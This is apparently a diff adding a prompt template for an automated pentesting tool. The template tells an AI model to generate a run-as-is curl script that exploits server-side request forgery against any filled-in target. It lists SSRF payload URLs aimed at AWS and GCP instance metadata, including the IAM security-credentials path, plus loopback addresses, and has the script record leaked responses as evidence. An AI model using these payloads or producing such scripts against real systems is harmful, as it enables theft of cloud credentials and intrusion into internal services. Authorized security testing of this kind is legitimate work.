@@ -1,0 +1,43 @@
+You are an expert penetration tester generating a Server-Side Request Forgery (SSRF) proof-of-concept exploit.
+
+TARGET: {{TARGET_URL}}
+ROUTE: {{ROUTE}}
+METHOD: {{METHOD}}
+INPUT: {{INPUT_NAME}} ({{INPUT_TYPE}})
+NOTES: {{NOTES}}
+
+Generate a self-contained curl exploit script (bash).
+
+SSRF TARGETS TO TRY (in order):
+1. http://169.254.169.254/latest/meta-data/ — AWS instance metadata
+2. http://169.254.169.254/latest/meta-data/iam/security-credentials/ — AWS IAM credentials
+3. http://metadata.google.internal/computeMetadata/v1/ with -H "Metadata-Flavor: Google" — GCP metadata
+4. http://localhost:80/ — local HTTP service
+5. http://127.0.0.1:8080/ — common internal port
+6. http://0/ — alternative loopback form
+
+REQUIREMENTS:
+- Script must run as-is with no modification
+- Try each target; stop and mark confirmed on first that returns internal data
+- An SSRF is confirmed if:
+  - Response contains cloud metadata fields (ami-id, instance-type, iam, computeMetadata, serviceAccounts)
+  - Response body contains content clearly from an internal service (not a public-facing error page)
+  - Response status is 200 and body length is substantially larger than a baseline error response
+- Write evidence to /workspace/evidence.json:
+  {
+    "confirmed": true/false,
+    "payload": "<ssrf target url used or empty string>",
+    "response": "<truncated response body, max 500 chars>",
+    "statusCode": <http status code as integer>,
+    "responseTimeMs": <elapsed ms as integer>
+  }
+
+FOR CURL SCRIPTS:
+- Use -s -o /tmp/response_body.txt -w "%{http_code}" to capture body and status
+- Set the SSRF target as the value of {{INPUT_NAME}} parameter
+- For query params: curl "{{TARGET_URL}}{{ROUTE}}?{{INPUT_NAME}}=<ssrf_url>"
+- For body inputs: curl -X {{METHOD}} -H "Content-Type: application/json" -d '{"{{INPUT_NAME}}":"<ssrf_url>"}' "{{TARGET_URL}}{{ROUTE}}"
+- Use --max-time 5 to avoid hanging on filtered ports
+- Measure responseTimeMs: START=$(date +%s%3N); <curl command>; END=$(date +%s%3N); MS=$((END-START))
+
+Return ONLY the script. No explanation, no markdown fences.
